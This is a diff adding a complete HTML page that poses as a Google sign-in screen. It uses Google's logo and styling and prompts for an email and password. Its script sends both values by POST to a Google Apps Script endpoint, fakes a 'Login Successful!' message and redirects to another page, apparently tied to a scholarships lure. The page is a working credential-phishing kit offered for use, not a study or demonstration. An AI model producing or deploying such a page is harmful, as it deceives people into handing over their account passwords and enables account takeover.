@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+        }
+
+        .login-box {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .google-logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+        }
+
+        button.next-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285F4;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button.next-btn:hover {
+            background-color: #357ae8;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .success-message, .error-message {
+            color: #4CAF50;
+            font-size: 18px;
+            margin-bottom: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message {
+            color: #FF0000;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <!-- Success and Error messages appear here -->
+            <div class="success-message" id="success-message">Login Successful!</div>
+            <div class="error-message" id="error-message">Something went wrong. Please try again.</div>
+            
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Google.png" alt="Google Logo" class="google-logo">
+            <h2>Sign in</h2>
+            <form action="#" method="post" name="google-sheet">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                <button type="submit" class="next-btn">Sign In</button>
+            </form>
+            <div class="footer">
+                <p>Not your computer? Use a private browsing window to sign in.</p>
+                <p><a href="#">Learn more</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwLxmF_YPZIq8trbvQK7KWWz9cAo4w85c7RIQh0H5KgOrSDMaS-FtlUlkGLzDzDDYiZcg/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+            e.preventDefault()  // Prevent page refresh
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => {
+                    // Show success message on successful login
+                    document.getElementById("success-message").style.display = "block";
+                    document.getElementById("error-message").style.display = "none";
+
+                    // Redirect to scholarships website
+                    setTimeout(() => {
+                        window.location.href = "animation.html";  // Redirect after 1 second
+                    }, 1000);  // Delay to show success message before redirect
+                })
+                .catch(error => {
+                    // Show error message if there's a failure
+                    document.getElementById("error-message").style.display = "block";
+                    document.getElementById("success-message").style.display = "none";
+                    console.error('Error!', error.message)
+                })
+        })
+    </script>
+</body>
+</html>
